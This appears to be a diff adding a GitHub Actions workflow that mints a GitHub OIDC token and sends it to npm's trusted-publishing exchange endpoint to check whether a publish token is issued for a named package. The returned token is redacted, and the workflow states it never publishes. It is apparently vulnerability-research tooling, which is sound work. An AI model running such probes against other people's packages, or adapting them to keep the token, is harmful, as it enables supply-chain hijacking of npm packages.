@@ -1,0 +1,55 @@
+# Exchange probe — identical in spirit to the June PoC. Mints a GitHub OIDC
+# token for the npm audience, prints its claims, POSTs it to the token
+# exchange endpoint for the given package and prints the HTTP status and body
+# with any returned token redacted. It never runs `npm publish` and never
+# uses the returned credential.
+name: probe
+on:
+  workflow_dispatch:
+    inputs:
+      package:
+        description: "Package name to probe (e.g. @scope/name)"
+        required: true
+jobs:
+  exchange:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - shell: bash
+        env:
+          PKG: ${{ inputs.package }}
+        run: |
+          set -uo pipefail
+          IDTOK=$(curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=npm:registry.npmjs.org" | jq -r .value)
+          echo "::add-mask::$IDTOK"
+          echo "--- DECODED CLAIMS ---"
+          python3 - "$IDTOK" <<'PY'
+          import sys, json, base64
+          p = sys.argv[1].split(".")[1]; p += "=" * (-len(p) % 4)
+          c = json.loads(base64.urlsafe_b64decode(p))
+          keys = ["iss","aud","sub","repository","repository_id","repository_owner","repository_owner_id",
+                  "workflow_ref","job_workflow_ref","ref","event_name","actor","actor_id","iat","exp","jti"]
+          print(json.dumps({k: c.get(k) for k in keys}, indent=2))
+          PY
+          echo ""
+          echo "--- EXCHANGE PROBE ---"
+          ENC=$(python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$PKG")
+          URL="https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/${ENC}"
+          echo "POST $URL"
+          HTTP=$(curl -sSL -o /tmp/resp.json -w "%{http_code}" -D /tmp/resp.headers \
+            -X POST -H "Authorization: Bearer $IDTOK" "$URL")
+          echo "HTTP_STATUS: $HTTP"
+          echo "--- RESPONSE HEADERS ---"
+          grep -i -E '^(date|x-|content-type|npm-)' /tmp/resp.headers || true
+          echo "--- RESPONSE BODY (token redacted) ---"
+          jq 'if .token then (.token="REDACTED_LEN="+(.token|tostring|length|tostring)) else . end' /tmp/resp.json 2>/dev/null || cat /tmp/resp.json
+          echo ""
+          case "$HTTP" in
+            201) echo "VERDICT: exchange ISSUED a publish token from this repository." ;;
+            403) echo "VERDICT: binding exists but this token's claims were rejected." ;;
+            404) echo "VERDICT: no usable binding for this package (none / expired / see npm/cli#9969)." ;;
+            *)   echo "VERDICT: unexpected status $HTTP — read the body." ;;
+          esac
